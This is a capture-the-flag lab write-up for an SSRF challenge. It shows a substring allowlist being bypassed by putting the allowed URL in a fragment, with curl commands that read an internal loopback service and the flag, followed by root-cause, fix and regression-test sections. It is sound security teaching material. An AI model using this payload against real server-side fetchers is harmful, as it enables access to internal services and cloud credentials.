# Adrift Pwnbox Lab - SSRF Fragment Allowlist Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: SSRF, substring allowlist bypass, URL fragment parser mismatch, internal service disclosure

## Observation

URL fetcher app at `https://e60f6e72b65a.pwnbox-lab.com/` ("adrift").

Initial page hints:

- "a small fetcher. allowlisted destinations only."
- Challenge text: "The fetcher speaks to one address. Read the flag from 127.0.0.1:9000 anyway."

Frontend posts to `POST /api/fetch`:

```javascript
const res = await fetch('/api/fetch', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ url: input.value }),
});
```

Successful responses return `{ "body": "..." }`. Failures return `{ "error": "destination not in allowlist" }`.

## Hypothesis

The app enforces a single allowed destination but likely validates the URL as a raw string or with weaker logic than the HTTP client uses to connect. If the allowlist is substring-based, a fragment containing the allowed URL may satisfy validation while the request still targets loopback.

## Failed Assumptions

1. **Direct loopback fetch** — `http://127.0.0.1:9000/` returned `destination not in allowlist`.
2. **Userinfo parser confusion** — `https://e60f6e72b65a.pwnbox-lab.com@127.0.0.1:9000/` rejected before fetch.
3. **Encoded `@` (`%40`)** — still rejected; likely decoded or `@` explicitly blocked.
4. **Generic external hosts** — `https://example.com/` rejected.
5. **HTTP on allowed host** — `http://e60f6e72b65a.pwnbox-lab.com/` rejected; only HTTPS on the exact lab host worked.
6. **Path-only tricks on allowed host** — `https://e60f6e72b65a.pwnbox-lab.com/127.0.0.1:9000/` fetched the public Express app, not internal port 9000.
7. **Userinfo + fragment SecondQL pattern** — not applicable here because `@` in authority was blocked by allowlist logic.

## Working Theory

Only this URL shape passed allowlist checks:

```text
https://e60f6e72b65a.pwnbox-lab.com/
```

The bypass payload puts the allowed URL in the fragment while keeping loopback as the real authority:

```text
http://127.0.0.1:9000/#https://e60f6e72b65a.pwnbox-lab.com/
```

Validator likely does something equivalent to:

```javascript
if (!url.includes('https://e60f6e72b65a.pwnbox-lab.com/')) deny();
```

The HTTP client parses normally and connects to `127.0.0.1:9000`. Fragments are not sent on the wire.

## Evidence

### Baseline allowlist mapping

| URL | Result |
|---|---|
| `https://e60f6e72b65a.pwnbox-lab.com/` | Allowed; homepage returned |
| `https://example.com/` | `destination not in allowlist` |
| `http://127.0.0.1:9000/` | `destination not in allowlist` |
| `https://e60f6e72b65a.pwnbox-lab.com@127.0.0.1:9000/` | `destination not in allowlist` |

### Fragment bypass proof

```bash
curl -sS -X POST "https://e60f6e72b65a.pwnbox-lab.com/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/#https://e60f6e72b65a.pwnbox-lab.com/"}'
```

Response:

```text
metadata service
endpoints: /secret
```

### Flag retrieval

```bash
curl -sS -X POST "https://e60f6e72b65a.pwnbox-lab.com/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/secret#https://e60f6e72b65a.pwnbox-lab.com/"}'
```

Response:

```text
pwnbox{f4d1c8a3b9e7206d5c8a1f3b2e9d4607}
```

## Minimal Reproduction

1. Confirm only `https://e60f6e72b65a.pwnbox-lab.com/` is allowed.
2. Send fragment bypass to internal root and read metadata.
3. Fetch documented `/secret` endpoint with the same fragment suffix.

## Result

Confirmed chain:

```text
User-controlled url JSON field
-> substring allowlist on raw URL
-> fragment contains allowed destination string
-> HTTP client connects to 127.0.0.1:9000
-> internal metadata discloses /secret
-> flag returned in response body
```

Flag:

```text
pwnbox{f4d1c8a3b9e7206d5c8a1f3b2e9d4607}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| Direct `127.0.0.1:9000` | No allowed-host substring in URL |
| `allowed@127.0.0.1:9000` | `@` authority confusion blocked by allowlist |
| Allowed-host path tricks | Request stayed on public Express app |
| `http://allowed-host/` | Scheme/host combo not on allowlist |

## Why Working Test Worked

The raw URL string contained `https://e60f6e72b65a.pwnbox-lab.com/`, satisfying the substring check. The parser and HTTP client ignored the fragment for destination selection and requested `http://127.0.0.1:9000/secret` instead.

## Root Cause

1. Allowlist implemented as substring matching on the full URL string.
2. No parsed-hostname validation before fetch.
3. No rejection of fragments used to smuggle allowlist tokens.
4. Internal service on loopback returned sensitive data to the fetcher.

## Impact

- Reach internal HTTP services bound to loopback.
- Read sensitive endpoints such as `/secret`.
- In other deployments, same primitive could pivot to metadata, admin panels, or cloud instance credentials.

## Fix

- Parse URL with a strict library and validate normalized `protocol`, `hostname`, and `port`.
- Compare against an exact allowlist of origins, not substring matches.
- Reject fragments and userinfo unless explicitly required.
- Resolve DNS and block loopback, RFC1918, link-local, and metadata ranges.
- Do not reflect raw internal responses to users without access controls.

## Regression Test

- `http://127.0.0.1:9000/#https://allowed.example/` must be rejected.
- `url.includes(allowedHost)` style checks must not exist in production code.
- Parsed hostname must match allowlist after canonicalization.

## Report Summary

Adrift exposed a server-side fetcher restricted to one HTTPS destination. The allowlist was implemented as a substring check on the raw URL. By placing the allowed URL in a fragment, an attacker could fetch `http://127.0.0.1:9000/secret` and read the flag from the internal metadata service.
